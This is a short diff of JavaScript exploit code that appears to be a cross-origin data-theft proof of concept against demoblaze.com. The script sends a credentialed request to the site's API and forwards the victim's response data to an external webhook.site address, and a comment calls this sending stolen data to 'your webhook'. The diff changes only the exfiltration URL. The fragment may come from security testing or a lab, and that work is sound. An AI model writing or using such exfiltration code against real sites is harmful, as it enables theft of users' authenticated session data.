@@ -10,7 +10,7 @@
       var req = new XMLHttpRequest();
       req.onload = function () {
         // Send stolen data to your webhook or display it
-        location = 'https://webhook.site/https://demoblaze.com/index.html#?data=' + encodeURIComponent(this.responseText);
+        location = 'https://webhook.site/https://demoblaze.com/prod.html?idp_=' + encodeURIComponent(this.responseText);
       };
       req.open('GET','https://api.demoblaze.com/view', true);
       req.withCredentials = true;
